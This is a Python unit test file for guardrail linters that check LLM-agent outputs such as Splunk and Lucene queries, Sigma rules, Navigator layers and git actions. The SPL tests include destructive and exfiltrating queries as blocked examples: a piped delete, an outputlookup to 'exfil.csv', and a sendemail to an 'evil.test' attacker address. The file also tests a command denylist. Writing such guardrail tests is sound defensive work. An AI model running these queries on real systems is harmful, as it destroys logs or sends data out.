"""Unit tests for the deterministic output guardrails (linters).

These are pure, offline checks — no Ollama, no live SIEM — that vet what the
agents produce before it is executed or proposed to the human.
"""

from __future__ import annotations

from adept.guardrails import (
    lint_git_branch,
    lint_git_commit,
    lint_lucene,
    lint_navigator_layer,
    lint_query,
    lint_sigma,
    lint_spl,
    lint_tool_input,
)

VALID_RULE = """
title: Suspicious Whoami Execution
id: 7f8e6d3a-1b2c-4d5e-8f90-abcdef123456
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\\whoami.exe'
  condition: selection
level: low
"""


# ---------------------------------------------------------------------------
# SPL
# ---------------------------------------------------------------------------
def test_lint_spl_allows_a_plain_detection_search() -> None:
    report = lint_spl("search index=main EventCode=4688 | stats count by host")
    assert report.ok
    assert report.findings == []


def test_lint_spl_blocks_destructive_commands() -> None:
    # The headline guardrail: an LLM must never emit a search that deletes,
    # writes, or exfiltrates. Each of these piped commands is refused.
    for query in (
        "search index=main | delete",
        "search * | outputlookup exfil.csv",
        "| sendemail to=attacker@evil.test",
        "search x | stats count | collect index=summary",
    ):
        report = lint_spl(query)
        assert not report.ok, query
        assert any(item.code == "spl.forbidden_command" for item in report.blocking), query


def test_lint_spl_ignores_dangerous_words_inside_quotes() -> None:
    # "delete" only matters as a piped command, not as quoted search text.
    report = lint_spl('search index=main message="please delete this" | stats count')
    assert report.ok


def test_lint_spl_flags_unbalanced_syntax_and_empty() -> None:
    assert not lint_spl("search (index=main").ok
    assert not lint_spl("").ok
    assert not lint_spl("search x | ").ok


def test_lint_spl_honours_a_custom_denylist() -> None:
    # An operator-supplied denylist replaces the default set.
    custom = lint_spl("search x | dbinspect", denylist={"dbinspect"})
    assert not custom.ok
    # 'delete' is not in the custom list, so it is no longer blocked.
    assert lint_spl("search x | delete", denylist={"dbinspect"}).ok


# ---------------------------------------------------------------------------
# Lucene
# ---------------------------------------------------------------------------
def test_lint_lucene_allows_anchored_terms() -> None:
    report = lint_lucene("event.code:4688 AND process.name:cmd.exe")
    assert report.ok


def test_lint_lucene_blocks_leading_wildcards() -> None:
    assert not lint_lucene("*evil*").ok
    assert not lint_lucene("process.name:*.exe").ok


def test_lint_lucene_match_all_is_advisory_only() -> None:
    report = lint_lucene("*:*")
    assert report.ok  # advisory, not blocking
    assert any(item.code == "lucene.match_all" for item in report.advisory)


# ---------------------------------------------------------------------------
# Sigma
# ---------------------------------------------------------------------------
def test_lint_sigma_accepts_a_well_formed_rule() -> None:
    report = lint_sigma(VALID_RULE)
    assert report.ok, report.summary()


def test_lint_sigma_blocks_placeholder_or_missing_id() -> None:
    placeholder = lint_sigma(VALID_RULE.replace("7f8e6d3a-1b2c-4d5e-8f90-abcdef123456", "REPLACE-ME"))
    assert not placeholder.ok
    missing = lint_sigma(VALID_RULE.replace("id: 7f8e6d3a-1b2c-4d5e-8f90-abcdef123456\n", ""))
    assert not missing.ok


def test_lint_sigma_blocks_multiple_documents() -> None:
    report = lint_sigma(VALID_RULE + "\n---\n" + VALID_RULE)
    assert not report.ok
    assert any(item.code == "sigma.multiple_documents" for item in report.blocking)


def test_lint_sigma_reports_parse_errors() -> None:
    assert not lint_sigma("::: not valid yaml :::").ok


# ---------------------------------------------------------------------------
# Navigator
# ---------------------------------------------------------------------------
def test_lint_navigator_accepts_a_minimal_layer() -> None:
    layer = {
        "name": "ADEPT",
        "versions": {"layer": "4.5", "navigator": "5.2.0"},
        "domain": "enterprise-attack",
        "techniques": [{"techniqueID": "T1059", "score": 1}],
    }
    assert lint_navigator_layer(layer).ok


def test_lint_navigator_blocks_missing_fields_and_bad_json() -> None:
    assert not lint_navigator_layer({"name": "x"}).ok
    assert not lint_navigator_layer("{not json").ok


def test_lint_navigator_unknown_domain_is_advisory() -> None:
    layer = {
        "name": "x",
        "versions": {"layer": "4.5"},
        "domain": "klingon-attack",
        "techniques": [],
    }
    report = lint_navigator_layer(layer)
    assert report.ok
    assert any(item.code == "navigator.unknown_domain" for item in report.advisory)


# ---------------------------------------------------------------------------
# Git
# ---------------------------------------------------------------------------
def test_lint_git_branch_blocks_protected_and_invalid() -> None:
    assert lint_git_branch("feature/whoami-detection").ok
    assert not lint_git_branch("main", protected=["main", "release"]).ok
    assert not lint_git_branch("bad branch name").ok
    assert not lint_git_branch("").ok


def test_lint_git_commit_requires_a_message() -> None:
    assert lint_git_commit("Add whoami process-creation detection").ok
    assert not lint_git_commit("").ok
    assert lint_git_commit("x" * 80).ok  # long subject is advisory only
    assert any(item.code == "git.long_subject" for item in lint_git_commit("x" * 80).advisory)


# ---------------------------------------------------------------------------
# Registry dispatch
# ---------------------------------------------------------------------------
def test_lint_query_dispatches_by_siem() -> None:
    assert not lint_query("search x | delete", "splunk").ok
    assert not lint_query("*evil*", "elk").ok
    assert lint_query("field:value", "opensearch").ok


def test_lint_tool_input_maps_tools_to_linters() -> None:
    assert not lint_tool_input(
        "siem_search", {"backend": "splunk", "query": "search x | delete"}
    ).ok  # type: ignore[union-attr]
    assert not lint_tool_input("write_sigma_rule", {"content": "::: bad :::"}).ok  # type: ignore[union-attr]
    assert not lint_tool_input(
        "git_create_branch", {"name": "main"}, protected_branches=["main"]
    ).ok  # type: ignore[union-attr]
    # Tools without a lintable artifact return None so the middleware skips them.
    assert lint_tool_input("siem_get_fields", {"backend": "elk"}) is None
    assert lint_tool_input("future_tool", {}) is None
